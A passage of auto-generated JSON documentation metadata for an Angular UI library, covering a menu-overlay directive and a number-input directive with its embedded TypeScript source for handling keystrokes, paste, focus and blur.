        "selector": "[stoMenuOverlay]",
        "providers": [],
        "inputsClass": [],
        "outputsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "style.left.px",
            "defaultValue": "0",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 13,
            "type": "number",
            "decorators": []
          },
          {
            "name": "style.top.px",
            "defaultValue": "0",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 15,
            "type": "number",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "propertiesClass": [
          {
            "name": "left",
            "defaultValue": "0",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "number",
            "optional": false,
            "description": "",
            "line": 13,
            "decorators": [
              {
                "name": "HostBinding",
                "stringifiedArguments": "'style.left.px'"
              }
            ]
          },
          {
            "name": "menu",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "MatMenuPanel",
            "optional": false,
            "description": "",
            "line": 11,
            "modifierKind": [
              121,
              144
            ]
          },
          {
            "name": "top",
            "defaultValue": "0",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "number",
            "optional": false,
            "description": "",
            "line": 15,
            "decorators": [
              {
                "name": "HostBinding",
                "stringifiedArguments": "'style.top.px'"
              }
            ]
          }
        ],
        "methodsClass": [
          {
            "name": "setStyle",
            "args": [
              {
                "name": "element",
                "type": "HTMLButtonElement",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 35,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              121
            ],
            "jsdoctags": [
              {
                "name": "element",
                "type": "HTMLButtonElement",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          },
          {
            "name": "updatePosition",
            "args": [
              {
                "name": "event",
                "type": "MouseEvent",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "optional": false,
            "returnType": "void",
            "typeParameters": [],
            "line": 30,
            "deprecated": false,
            "deprecationMessage": "",
            "modifierKind": [
              123
            ],
            "jsdoctags": [
              {
                "name": "event",
                "type": "MouseEvent",
                "deprecated": false,
                "deprecationMessage": "",
                "tagName": {
                  "text": "param"
                }
              }
            ]
          }
        ],
            "constructorObj": {
              "name": "constructor",
              "description": "",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "trigger",
                  "type": "MatMenuTrigger",
                  "deprecated": false,
                  "deprecationMessage": ""
                },
                {
                  "name": "el",
                  "type": "ElementRef<HTMLButtonElement>",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "line": 15,
              "jsdoctags": [
                {
                  "name": "trigger",
                  "type": "MatMenuTrigger",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                },
                {
                  "name": "el",
                  "type": "ElementRef<HTMLButtonElement>",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            }
      },
      {
        "name": "NumberInputDirective",
        "id": "directive-NumberInputDirective-3c20963bd166ce50d458fa17a76ede87a12ef27329582c1856620fc14c1cb96d1eb9847bfd5369bacd7e666dcdbfda63335bca6bd9d765a8093b321502445713",
        "file": "libs/form/src/lib/number-input/number-input.directive.ts",
        "type": "directive",
        "description": "",
        "rawdescription": "\n",
        "sourceCode": "import { Directive, ElementRef, HostListener, Input } from '@angular/core';\r\nimport { Key } from '@ngx-stoui/core';\r\nimport { NumberInputPipe } from './number-input.pipe';\r\n\r\n\r\n// eslint-disable-next-line @angular-eslint/directive-selector\r\n@Directive({ selector: '[numberInput]' })\r\nexport class NumberInputDirective {\r\n  @Input()\r\n  unit: string | undefined;\r\n  @Input()\r\n  appendUnit: boolean;\r\n\r\n  private _el: HTMLInputElement;\r\n\r\n  @Input()\r\n  fractionSize = 5;\r\n  @Input()\r\n  dynamicFractionSize: boolean;\r\n  /**\r\n   * List of keys ignored, to work as default.\r\n   *  {Key[]}\r\n   */\r\n  private ignoredKeys = [\r\n    Key.Dash,\r\n    Key.Backspace,\r\n    Key.Delete,\r\n    Key.Home,\r\n    Key.LeftArrow,\r\n    Key.RightArrow,\r\n    Key.End,\r\n    Key.Tab,\r\n    Key.Subtract\r\n  ];\r\n\r\n\r\n  constructor(private elementRef: ElementRef,\r\n              private numberFormatPipe: NumberInputPipe,\r\n  ) {\r\n    this._el = this.elementRef.nativeElement;\r\n  }\r\n\r\n  public setDisplayValue(readonly: boolean) {\r\n    const val = ( this._el.value || '' ).replace(` ${this.unit}`, '');\r\n    if ( this.unit ) {\r\n      if ( readonly ) {\r\n        this._el.value = val + ` ${this.unit}`;\r\n      } else {\r\n        this._el.value = val;\r\n      }\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Listens for the paste events.\r\n   * Handles spaces, long dash, period and commas.\r\n   * Tries to the format, will be ignored if something fails.\r\n   * @param e event\r\n   * @param clipboardData\r\n   */\r\n  @HostListener('paste', [ '$event', '$event.clipboardData' ])\r\n  onPaste(e: Event, clipboardData: DataTransfer | null) {\r\n    if ( this._el.readOnly || this._el.disabled || !clipboardData ) {\r\n      return;\r\n    }\r\n    e.preventDefault();\r\n    let pasted = clipboardData.getData('text') || '';\r\n    pasted = pasted.replace('—', '-'); // long dash, sometime used in Excel and Word\r\n    pasted = this.handleMixedCommasAndDecimals(pasted);\r\n    let parsedValue = this.numberFormatPipe.parse(pasted, this.fractionSize, this.dynamicFractionSize);\r\n\r\n    if ( !this.hasInvalidValues(parsedValue) ) {\r\n\r\n      parsedValue = parsedValue.replace('.', ',');\r\n      this._el.value = parsedValue;\r\n      this._el.dispatchEvent(new Event('input'));\r\n    }\r\n  }\r\n\r\n  /**\r\n   *  Handles thousand seperator with commas\r\n   * @param orgStr eg. 123.214,123\r\n   * {string} 123214.123\r\n   */\r\n  private handleMixedCommasAndDecimals(orgStr: string) {\r\n    let str = orgStr + '';\r\n    str = str.replace(',', '.');\r\n    const array = str.split('.');\r\n    if ( array.length > 1 ) {\r\n      const prefix = array.slice(0, array.length - 1).join('');\r\n      str = prefix + '.' + array[ array.length - 1 ];\r\n    } else {\r\n      str = orgStr;\r\n    }\r\n    return str;\r\n  }\r\n\r\n\r\n  /**\r\n   * Se if parsed string contains words that indicate a failed parse.\r\n   * @param parsedValue\r\n   * {boolean}\r\n   */\r\n  private hasInvalidValues(parsedValue: string) {\r\n    return parsedValue.includes('NaN')\r\n      || parsedValue.includes('undefined')\r\n      || parsedValue.includes('null');\r\n  }\r\n\r\n  /**\r\n   * Listen for key event to work like a number field.\r\n   * Transforms period to comma.\r\n   * Handles hash, allows copy,pase,cut and select all.\r\n   * @param e\r\n   */\r\n  @HostListener('keydown', [ '$event' ])\r\n  onKeyPress(e: KeyboardEvent) {\r\n    if ( this._el.readOnly || this._el.disabled ) {\r\n      return;\r\n    }\r\n    if ( [ Key.Enter ].includes(e.which) ) {\r\n      this._el.blur();\r\n    }\r\n    if ( this.isNumberKeypress(e) ) {\r\n      // do nothing\r\n    } else if ( [ Key.Period, Key.Comma, Key.DecimalPoint ].includes(e.which) ) {\r\n      this.handlePeriodDelimiter(e);\r\n    } else if ( [ Key.Dash, Key.Subtract ].includes(e.which) ) {\r\n      this.handleDash(e);\r\n    } else if ( [ Key.UpArrow, Key.DownArrow ].includes(e.which) ) {\r\n      this.handleKeyUpAndDown(e);\r\n    } else if ( this.ignoredKeys.indexOf(e.which) !== -1 ) {\r\n    } else if ( this.isCopyPaste(e) || this.isCtrlA(e) ) {\r\n    } else {\r\n      e.preventDefault();\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Handles dash. Is ignored if already exist a comma.\r\n   * Replaces period with comma.\r\n   * @param e\r\n   */\r\n  private handlePeriodDelimiter(e: KeyboardEvent) {\r\n    let selectionIncludesPeriod = false;\r\n    if (!e.target) {\r\n      return;\r\n    }\r\n    const target = e.target as HTMLInputElement;\r\n    if ( target.selectionStart !== target.selectionEnd && this._el.value && this._el.value.length > 0 ) {\r\n      // eslint-disable-next-line @typescript-eslint/ban-ts-comment\r\n      // @ts-ignore\r\n      const selection = this._el.value.substring(target.selectionStart, target.selectionEnd);\r\n      selectionIncludesPeriod = selection.includes(',');\r\n    }\r\n\r\n    if ( this._el.value.includes(',') && !selectionIncludesPeriod ) {\r\n      e.preventDefault();\r\n    } else if ( e.which === Key.Period ) {\r\n      setTimeout(() => {\r\n        const target = e.target as HTMLInputElement;\r\n        const caretPosition = target.selectionStart;\r\n        this._el.value = this._el.value.replace('.', ',');\r\n        this._el.setSelectionRange(caretPosition, caretPosition);\r\n\r\n      }, 0);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * All text is selected in the input\r\n   * @param e\r\n   * {boolean}\r\n   */\r\n  private hasSelectedAllText(e: KeyboardEvent) {\r\n    const target = e.target as HTMLInputElement;\r\n    if (!target) {\r\n      return;\r\n    }\r\n    // eslint-disable-next-line @typescript-eslint/ban-ts-comment\r\n    // @ts-ignore\r\n    return target.selectionEnd - target.selectionStart === this._el.value.length;\r\n\r\n  }\r\n\r\n  /**\r\n   * Handles dashes. Should only be allowed in the beginning and only once.\r\n   * @param e\r\n   */\r\n  private handleDash(e: KeyboardEvent) {\r\n    if (!e.target) {\r\n      return;\r\n    }\r\n    if ( this.hasSelectedAllText(e) ) {\r\n    } else if ( !this._el.value.includes('-') && (e.target as HTMLInputElement).selectionStart === 0 ) {\r\n    } else {\r\n      e.preventDefault();\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Is copy, paste or cut.\r\n   * @param e\r\n   * {boolean}\r\n   */\r\n  private isCopyPaste(e: KeyboardEvent) {\r\n    return ( e.ctrlKey || e.metaKey ) && ( e.which === Key.C || e.which === Key.V || e.which === Key.X );\r\n  }\r\n\r\n  /**\r\n   * Is select all text (CTRL+A)\r\n   * @param e\r\n   * {boolean}\r\n   */\r\n  private isCtrlA(e: KeyboardEvent) {\r\n    return ( e.ctrlKey || e.metaKey ) && ( e.which === Key.A );\r\n  }\r\n\r\n  /**\r\n   * Is a number, on keyboard and on numpad.\r\n   * @param e\r\n   * {boolean}\r\n   */\r\n  private isNumberKeypress(e: KeyboardEvent) {\r\n    return ( e.keyCode >= 48 && e.keyCode <= 57 ) || ( e.keyCode >= 96 && e.keyCode <= 105 );\r\n  }\r\n\r\n\r\n  /**\r\n   * Handles up and down arrows by adding/subtracting one\r\n   * @param e\r\n   */\r\n  private handleKeyUpAndDown(e: KeyboardEvent) {\r\n    if ( this._el.readOnly || this._el.disabled ) {\r\n      return;\r\n    }\r\n    const value = this._el.value;\r\n    const addition = e.which === Key.UpArrow ? 1 : -1;\r\n    // eslint-disable-next-line prefer-const\r\n    let [ integerSplit = '', fractionSplit = '' ] = ( value || '' ).split(',');\r\n    integerSplit = integerSplit.replace(' ', '');\r\n    if ( integerSplit.length === 0 ) {\r\n      integerSplit = '0';\r\n    }\r\n    const currentValue = parseInt(integerSplit, 10);\r\n\r\n    setTimeout(() => {\r\n      if ( fractionSplit.length > 0 ) {\r\n        this._el.value = ( ( currentValue + addition ) + ',' + fractionSplit );\r\n      } else {\r\n        this._el.value = ( currentValue + addition ) + '';\r\n      }\r\n      this._el.dispatchEvent(new Event('input'));\r\n    }, 0);\r\n\r\n  }\r\n\r\n  @HostListener('focus', [ '$event' ])\r\n  onFocus($event: FocusEvent) {\r\n    if ( this._el.readOnly || this._el.disabled ) {\r\n      return;\r\n    }\r\n    const target = $event.target as HTMLInputElement;\r\n    const value = target.value;\r\n    this._el.value = ( this.numberFormatPipe.parse(value, this.fractionSize, this.dynamicFractionSize) + '' ).replace('.', ',');\r\n    this._el.select();\r\n  }\r\n\r\n  @HostListener('blur', [ '$event.target.value' ])\r\n  onBlur(value: number) {\r\n    if ( this._el.readOnly || this._el.disabled ) {\r\n      return;\r\n    }\r\n    this._el.value = this.numberFormatPipe.transform(value, this.fractionSize, this.dynamicFractionSize);\r\n  }\r\n\r\n}\r\n",
        "selector": "[numberInput]",
        "providers": [],
        "inputsClass": [
          {
            "name": "appendUnit",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 13,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "dynamicFractionSize",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 20,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "fractionSize",
            "defaultValue": "5",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 18,
            "type": "number",
            "decorators": []
          },
          {
            "name": "unit",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 11,
            "type": "string | undefined",
            "decorators": []
          }
        ],
        "outputsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [
          {
            "name": "blur",
            "args": [
              {
                "name": "value",
                "type": "number",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "argsDecorator": [
              "$event.target.value"
            ],
            "deprecated": false,
            "deprecationMessage": "",
            "line": 271
          },
          {
            "name": "focus",
            "args": [
              {
                "name": "$event",
                "type": "FocusEvent",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "argsDecorator": [
              "$event"
            ],
            "deprecated": false,
            "deprecationMessage": "",
            "line": 260
          },
          {
            "name": "keydown",
            "args": [
              {
                "name": "e",
                "type": "KeyboardEvent",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "argsDecorator": [
              "$event"
            ],
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nListen for key event to work like a number field.\nTransforms period to comma.\nHandles hash, allows copy,pase,cut and select all.\n",
            "description": "<p>Listen for key event to work like a number field.\nTransforms period to comma.\nHandles hash, allows copy,pase,cut and select all.</p>\n",
            "jsdoctags": [
              {
                "pos": 3194,
                "end": 3207,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 338,
                "tagName": {
                  "pos": 3195,
                  "end": 3200,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "param"
                },
                "comment": "",
                "name": {
                  "pos": 3201,
                  "end": 3202,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "e"
                },
                "isNameFirst": true,
                "isBracketed": false
              }
            ],
            "line": 118
          },
          {
            "name": "paste",
            "args": [
              {
                "name": "e",
                "type": "Event",
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "clipboardData",
                "type": "DataTransfer | null",
                "deprecated": false,
                "deprecationMessage": ""
              }
            ],
            "argsDecorator": [
              "$event",
              "$event.clipboardData"
            ],
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nListens for the paste events.\nHandles spaces, long dash, period and commas.\nTries to the format, will be ignored if something fails.\n",
            "description": "<p>Listens for the paste events.\nHandles spaces, long dash, period and commas.\nTries to the format, will be ignored if something fails.</p>\n",
            "jsdoctags": [
              {
                "pos": 1429,
                "end": 1450,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 338,
                "tagName": {
                  "pos": 1430,
                  "end": 1435,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "param"
                },
                "comment": "<p>event</p>\n",
                "name": {
                  "pos": 1436,
                  "end": 1437,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "e"
                },
                "isNameFirst": true,
                "isBracketed": false
              },
              {
                "pos": 1450,
                "end": 1475,
                "flags": 4227072,
                "modifierFlagsCache": 0,
                "transformFlags": 0,
                "kind": 338,
                "tagName": {
                  "pos": 1451,
                  "end": 1456,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "param"
                },
                "comment": "",
                "name": {
                  "pos": 1457,
                  "end": 1470,
                  "flags": 4227072,
                  "modifierFlagsCache": 0,
                  "transformFlags": 0,
                  "kind": 79,
                  "escapedText": "clipboardData"
                },
                "isNameFirst": true,
                "isBracketed": false
              }
            ],
            "line": 63
          }
            ],
            "propertiesClass": [
              {
                "name": "_el",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "HTMLInputElement",
                "optional": false,
                "description": "",
                "line": 15,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "ignoredKeys",
                "defaultValue": "[\r\n    Key.Dash,\r\n    Key.Backspace,\r\n    Key.Delete,\r\n    Key.Home,\r\n    Key.LeftArrow,\r\n    Key.RightArrow,\r\n    Key.End,\r\n    Key.Tab,\r\n    Key.Subtract\r\n  ]",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "[]",
                "optional": false,
                "description": "<p>List of keys ignored, to work as default.\n {Key[]}</p>\n",
                "line": 25,
                "rawdescription": "\n\nList of keys ignored, to work as default.\n {Key[]}\n",
                "modifierKind": [
                  121
                ]
              }
            ],
            "methodsClass": [
              {
                "name": "handleDash",
                "args": [
                  {
                    "name": "e",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 191,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\nHandles dashes. Should only be allowed in the beginning and only once.\n",
                "description": "<p>Handles dashes. Should only be allowed in the beginning and only once.</p>\n",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": {
                      "pos": 5597,
                      "end": 5598,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "e"
                    },
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "pos": 5591,
                      "end": 5596,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "param"
                    },
                    "comment": ""
                  }
                ]
              },
              {
                "name": "handleKeyUpAndDown",
                "args": [
                  {
                    "name": "e",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 234,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\nHandles up and down arrows by adding/subtracting one\n",
                "description": "<p>Handles up and down arrows by adding/subtracting one</p>\n",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": {
                      "pos": 6637,
                      "end": 6638,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "e"
                    },
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "pos": 6631,
                      "end": 6636,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "param"
                    },
                    "comment": ""
                  }
                ]
              },
              {
                "name": "handleMixedCommasAndDecimals",
                "args": [
                  {
                    "name": "orgStr",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "string",
                "typeParameters": [],
                "line": 86,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\n Handles thousand seperator with commas\n{string} 123214.123\n",
                "description": "<p> Handles thousand seperator with commas\n{string} 123214.123</p>\n",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": {
                      "pos": 2296,
                      "end": 2302,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "orgStr"
                    },
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "pos": 2290,
                      "end": 2295,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "param"
                    },
                    "comment": "<p>eg. 123.214,123\n{string} 123214.123</p>\n"
                  }
                ]
              },
              {
                "name": "handlePeriodDelimiter",
                "args": [
                  {
                    "name": "e",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 145,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\nHandles dash. Is ignored if already exist a comma.\nReplaces period with comma.\n",
                "description": "<p>Handles dash. Is ignored if already exist a comma.\nReplaces period with comma.</p>\n",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": {
                      "pos": 4105,
                      "end": 4106,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "e"
                    },
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "pos": 4099,
                      "end": 4104,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "param"
                    },
                    "comment": ""
                  }
                ]
              },
              {
                "name": "hasInvalidValues",
                "args": [
                  {
                    "name": "parsedValue",
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "any",
                "typeParameters": [],
                "line": 105,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\nSe if parsed string contains words that indicate a failed parse.\n{boolean}\n",
                "description": "<p>Se if parsed string contains words that indicate a failed parse.\n{boolean}</p>\n",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": {
                      "pos": 2817,
                      "end": 2828,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "parsedValue"
                    },
                    "type": "string",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "pos": 2811,
                      "end": 2816,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "param"
                    },
                    "comment": "",
                    "typeExpression": {
                      "pos": 2835,
                      "end": 2844,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 307,
                      "type": {
                        "pos": 2836,
                        "end": 2843,
                        "flags": 4194304,
                        "modifierFlagsCache": 0,
                        "transformFlags": 1,
                        "kind": 133
                      }
                    }
                  }
                ]
              },
              {
                "name": "hasSelectedAllText",
                "args": [
                  {
                    "name": "e",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "boolean",
                "typeParameters": [],
                "line": 176,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\nAll text is selected in the input\n{boolean}\n",
                "description": "<p>All text is selected in the input\n{boolean}</p>\n",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": {
                      "pos": 5155,
                      "end": 5156,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "e"
                    },
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "pos": 5149,
                      "end": 5154,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "param"
                    },
                    "comment": "",
                    "typeExpression": {
                      "pos": 5163,
                      "end": 5172,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 307,
                      "type": {
                        "pos": 5164,
                        "end": 5171,
                        "flags": 4194304,
                        "modifierFlagsCache": 0,
                        "transformFlags": 1,
                        "kind": 133
                      }
                    }
                  }
                ]
              },
              {
                "name": "isCopyPaste",
                "args": [
                  {
                    "name": "e",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "boolean",
                "typeParameters": [],
                "line": 207,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\nIs copy, paste or cut.\n{boolean}\n",
                "description": "<p>Is copy, paste or cut.\n{boolean}</p>\n",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": {
                      "pos": 5943,
                      "end": 5944,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "e"
                    },
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "pos": 5937,
                      "end": 5942,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "param"
                    },
                    "comment": "",
                    "typeExpression": {
                      "pos": 5951,
                      "end": 5960,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 307,
                      "type": {
                        "pos": 5952,
                        "end": 5959,
                        "flags": 4194304,
                        "modifierFlagsCache": 0,
                        "transformFlags": 1,
                        "kind": 133
                      }
                    }
                  }
                ]
              },
              {
                "name": "isCtrlA",
                "args": [
                  {
                    "name": "e",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "boolean",
                "typeParameters": [],
                "line": 216,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\nIs select all text (CTRL+A)\n{boolean}\n",
                "description": "<p>Is select all text (CTRL+A)\n{boolean}</p>\n",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": {
                      "pos": 6179,
                      "end": 6180,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "e"
                    },
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "pos": 6173,
                      "end": 6178,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "param"
                    },
                    "comment": "",
                    "typeExpression": {
                      "pos": 6187,
                      "end": 6196,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 307,
                      "type": {
                        "pos": 6188,
                        "end": 6195,
                        "flags": 4194304,
                        "modifierFlagsCache": 0,
                        "transformFlags": 1,
                        "kind": 133
                      }
                    }
                  }
                ]
              },
              {
                "name": "isNumberKeypress",
                "args": [
                  {
                    "name": "e",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "boolean",
                "typeParameters": [],
                "line": 225,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\nIs a number, on keyboard and on numpad.\n{boolean}\n",
                "description": "<p>Is a number, on keyboard and on numpad.\n{boolean}</p>\n",
                "modifierKind": [
                  121
                ],
                "jsdoctags": [
                  {
                    "name": {
                      "pos": 6381,
                      "end": 6382,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "e"
                    },
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "pos": 6375,
                      "end": 6380,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 79,
                      "escapedText": "param"
                    },
                    "comment": "",
                    "typeExpression": {
                      "pos": 6389,
                      "end": 6398,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
                      "transformFlags": 0,
                      "kind": 307,
                      "type": {
                        "pos": 6390,
                        "end": 6397,
                        "flags": 4194304,
                        "modifierFlagsCache": 0,
                        "transformFlags": 1,
                        "kind": 133
                      }
                    }
                  }
                ]
              },
              {
                "name": "onBlur",
                "args": [
                  {
                    "name": "value",
                    "type": "number",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 271,
                "deprecated": false,
                "deprecationMessage": "",
                "decorators": [
                  {
                    "name": "HostListener",
                    "stringifiedArguments": "'blur', ['$event.target.value']"
                  }
                ],
                "jsdoctags": [
                  {
                    "name": "value",
                    "type": "number",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "onFocus",
                "args": [
                  {
                    "name": "$event",
                    "type": "FocusEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 260,
                "deprecated": false,
                "deprecationMessage": "",
                "decorators": [
                  {
                    "name": "HostListener",
                    "stringifiedArguments": "'focus', ['$event']"
                  }
                ],
                "jsdoctags": [
                  {
                    "name": "$event",
                    "type": "FocusEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "onKeyPress",
                "args": [
                  {
                    "name": "e",
                    "type": "KeyboardEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 118,
                "deprecated": false,
                "deprecationMessage": "",
                "rawdescription": "\n\nListen for key event to work like a number field.\nTransforms period to comma.\nHandles hash, allows copy,pase,cut and select all.\n",
                "description": "<p>Listen for key event to work like a number field.\nTransforms period to comma.\nHandles hash, allows copy,pase,cut and select all.</p>\n",
                "decorators": [
                  {
                    "name": "HostListener",
                    "stringifiedArguments": "'keydown', ['$event']"
                  }
                ],
                "jsdoctags": [
                  {
                    "name": {
                      "pos": 3201,
                      "end": 3202,
                      "flags": 4227072,
                      "modifierFlagsCache": 0,
